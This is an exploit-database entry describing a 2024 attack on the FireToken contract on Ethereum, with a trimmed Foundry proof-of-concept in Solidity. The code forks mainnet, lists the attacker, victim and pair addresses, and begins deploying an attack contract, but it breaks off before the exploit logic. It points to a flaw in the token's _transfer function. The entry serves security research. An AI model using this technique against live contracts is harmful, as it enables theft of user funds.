# [?] FireToken - Pair Manipulation With Transfer Function

## Summary
Severity: Unknown
Chain: Ethereum
Component: FireToken
Published: 2024-10-01
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-10/FireToken_exp.sol
Type: defi-exploit-poc

## Details
Lost: 8.45 ETH (~$20K USD)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 8.45 ETH (~$20K USD)
// Attacker : https://etherscan.io/address/0x81f48a87ec44208c691f870b9d400d9c13111e2e
// Attack Contract : https://etherscan.io/address/0x9776c0abe8ae3c9ca958875128f1ae1d5afafcb8
// Vulnerable Contract : https://etherscan.io/address/0x18775475f50557b96C63E8bbf7D75bFeB412082D
// Attack Tx : https://etherscan.io/tx/0xd20b3b31a682322eb0698ecd67a6d8a040ccea653ba429ec73e3584fa176ff2b
// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x18775475f50557b96C63E8bbf7D75bFeB412082D#code
// L274-279, _transfer() function

// @POC Author : [rotcivegaf](https://twitter.com/rotcivegaf)

// Contracts involved
address constant AAVEPool = 0xC13e21B648A5Ee794902342038FF3aDAB66BE987;
address constant weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
address constant UniswapV2Router02 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
address constant FIRE = 0x18775475f50557b96C63E8bbf7D75bFeB412082D;
address constant UniPairWETHFIRE = 0xcC27779013a1ccA68D3d93c640aaC807891Fd029;

contract FireToken_exp is Test {
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.createSelectFork("mainnet", 20_869_375 - 1);
    }

    function testPoC() public {
        vm.startPrank(attacker);
        AttackerC attackerC = new AttackerC();
        vm.label(address(attackerC), "attackerC");
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-10/FireToken_exp.sol_
